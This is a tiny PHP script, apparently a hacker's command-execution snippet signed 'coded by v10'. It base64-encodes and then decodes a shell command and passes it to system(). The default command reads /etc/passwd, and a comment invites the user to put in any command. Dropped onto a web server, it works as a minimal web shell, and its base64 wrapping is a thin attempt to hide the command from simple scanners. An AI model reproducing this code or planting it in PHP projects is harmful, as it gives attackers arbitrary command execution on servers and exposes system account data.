<?php
// coded by v10
$command = "cat /etc/passwd"; // put here any command &_&
$command = base64_encode($command);
system(base64_decode($command));
?>
